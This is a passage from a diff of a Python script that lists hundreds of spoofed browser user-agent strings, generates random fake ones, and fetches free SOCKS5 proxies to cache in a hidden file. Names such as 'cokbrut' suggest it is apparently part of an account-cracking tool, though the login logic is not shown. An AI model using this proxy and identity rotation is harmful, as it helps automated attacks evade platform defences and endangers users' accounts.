10.12; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.132 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.111 Safari/537.36', 'Mozilla/5.0 (Windows NT 5.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.127 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML like Gecko) Chrome/81.0.4044.117 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.2; Trident/5.0)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:51.0) Gecko/20100101 Firefox/51.0','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.89 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.89 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko', 'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:49.0) Gecko/20100101 Firefox/49.0', 'Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.111 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.102 Safari/537.36', 'Mozilla/5.0 (Windows NT 5.1; rv:47.0) Gecko/20100101 Firefox/47.0', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.105 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0', 'Mozilla/5.0 (Windows NT 5.1; rv:49.0) Gecko/20100101 Firefox/49.0', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; Win64; x64; Trident/6.0)', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Win64; x64; Trident/4.0)', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.1; WOW64; Trident/6.0)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:49.0) Gecko/20100101 Firefox/49.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.114 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.99 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.83 Safari/537.36', 'Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:50.0) Gecko/20100101 Firefox/50.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.111 Safari/537.36', 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.111 Safari/537.36', 'Mozilla/5.0 (Windows NT 5.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:50.0) Gecko/20100101 Firefox/50.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0', 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.81 Safari/537.36', 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:50.0) Gecko/20100101 Firefox/50.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.80 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (Windows NT 10.0; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/537.36 (KHTML like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (X11; Linux x86_64; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:50.0) Gecko/20100101 Firefox/50.0', 'Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.132 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.120 Safari/537.36', 'Mozilla/5.0 (Windows NT 5.1; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.127 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 10.0; Trident/5.0)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.149 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.81 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.102 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.2; WOW64; Trident/5.0)', 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.99 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (Windows NT 5.1; WOW64; Trident/7.0; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.132 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.111 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.2; Win64; x64; Trident/5.0)', 'Mozilla/5.0 (Windows NT 6.1; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.78 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.114 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.111 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 10.0; Trident/4.0)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.96 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.114 Safari/537.36', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; Win64; x64; Trident/6.0)', 'Mozilla/5.0 (X11; Linux x86_64; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.99 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.132 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (Windows NT 6.2; rv:50.0) Gecko/20100101 Firefox/50.0', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.3; WOW64; Trident/6.0)', 'Mozilla/5.0 (X11; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0', 'Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.125 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.135 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0', 'Mozilla/5.0 (Windows NT 6.2; Trident/7.0; rv:11.0) like Gecko', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (Windows NT 5.1; rv:47.0) Gecko/20100101 Firefox/47.0', 'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (Windows NT 5.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.1; WOW64; Trident/5.0)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:50.0) Gecko/20100101 Firefox/50.0', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 10.0; Trident/5.0)', 'Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (X11; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_7) AppleWebKit/537.36 (KHTML like Gecko) Chrome/83.0.4103.101 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.2; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.105 Safari/537.36', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 10.0; Win64; x64; Trident/4.0)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.111 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.81 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.121 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; rv:11.0) like Gecko', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.89 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.3; WOW64; Trident/6.0)', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.111 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.83 Safari/537.36', 'Mozilla/5.0 (Windows NT 5.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (Windows NT 6.2; WOW64; Trident/7.0; rv:11.0) like Gecko', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.78 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64; rv:50.0) Gecko/20100101 Firefox/50.0', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.149 Safari/537.36', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; Trident/6.0)', 'Mozilla/5.0 (Windows NT 10.0; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/83.0.4103.101 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.78 Safari/537.36', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.2; Win64; x64; Trident/4.0)', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.78 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.75 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.96 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.78 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.121 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.110 Safari/537.36', 'Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.111 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.105 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.132 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.75 Safari/537.36', 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (X11; Linux i686; rv:49.0) Gecko/20100101 Firefox/49.0', 'Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.111 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.80 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.101 Safari/537.36', 'Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.99 Safari/537.36', 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0)', 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:49.0) Gecko/20100101 Firefox/49.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.135 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:51.0) Gecko/20100101 Firefox/51.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.149 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0', 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.99 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.81 Safari/537.36', 'Mozilla/5.0 (Windows NT 5.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0']
+ua = ["Mozilla/5.0 (Linux; Android 11; moto g(40) fusion Build/RRI31.Q1-42-51-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",]
+uas_bawaan = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36 (KHTML, like Gecko) Chrome/86.0.4240.114 Safari/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 (KHTML, like Gecko) Chrome/86.0.4240.114 Safari/537.36(KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
+uas_nokiac2 = "NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile"
+uas_nokiax20 = "Mozilla/5.0 (Linux; Android 12; Nokia X20 Build/SKQ1.210821.001; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36"
+uas_nokiax = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)"
+uas_samsungse = "Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.3"
+uas_redmi9a = "Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36"
+uas_nokiaxl = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12"
+uas_chromelinux = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"
+uas_j7prime = "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501"
+uas_tes = "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4X Build/MiUI MS; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 38.0.0.13.95 Android (24/7.0; 480dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4X; mido; qcom; ru_RU; 99640911)"
+uas_random = random.choice(["Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"])
+uas_nokiac3 = "NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"
+uas_nokia5plus = "Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
+uas_random2 = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])
+ugen2 = ['NokiaC2-01/5.0 (11.40) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0 (Java; U; MIDP-2.0; ar; nokiac2-01) U2/1.0.0 UCBrowser/8.9.0.251 U2/1.0.0 Mobile UNTRUSTED/1.0']
+ugen=['NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Opera/9.80 (Android; Opera Mini/7.5.33361/191.273; U; pt) Presto/2.12.423 Version/12.16 UNTRUSTED/1.0']
+ugen2=[]
+ugen=[]
 cokbrut=[]
 ses=requests.Session()
 princp=[]
 try:
-	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
-	
+	prox = requests.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all').text
+	open('.prox.txt','w').write(prox)
 except Exception as e:
-	print('seo')
-
+	print(' ')
+prox=open('.prox.txt','r').read().splitlines()
 for xd in range(10000):
 	a='Mozilla/5.0 (Symbian/3; Series60/'
 	b=random.randrange(1, 9)
@@ -370,41 +157,57 @@ for xd in range(10000):
 	j=random.randrange(1, 4)
 	k='Mobile Safari/535.1'
 	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
-	ugen2.append(uaku)
-
-
+	ugen2.append(uaku)    
+	
 	aa='Mozilla/5.0 (Linux; Android'
-	b=random.choice(['2','3','4','5','5.2','6','6.0.1','7','8','9','10','11','11','11.0.1','12','13'])
-	c=random.choice(['OPPO A57 Build/MMB29M; wv'])
-	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
-	e=random.randrange(80,106)
-	f='0'
-	g=random.randrange(3904,5000)
-	h=random.randrange(40,100)
-	i='MQQBrowser/6.2 TBS/045713 Mobile Safari/537.36 MMWEBID/4383 MicroMessenger/8.0.10.1960(0x28000A3D) Process/tools WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64'
-	uaku2=f'{aa} {b}; {c}) {d}{e}.{f}.{g}.{h} {i}'
-	ugen.append(uaku2)
-for x in range(10):
-	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-SM-'
-	b=random.randrange(100, 9999)
-	c=random.randrange(100, 9999)
+	b=random.choice(['7.0','8.1.0','9','10','11','12'])
+	c=random.choice(['Series60/3.1 NokiaE71-1/100.07.57; Profile/MIDP-2.0 Configuration/CLDC-1.1 )'])
 	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	e=random.randrange(1, 999)
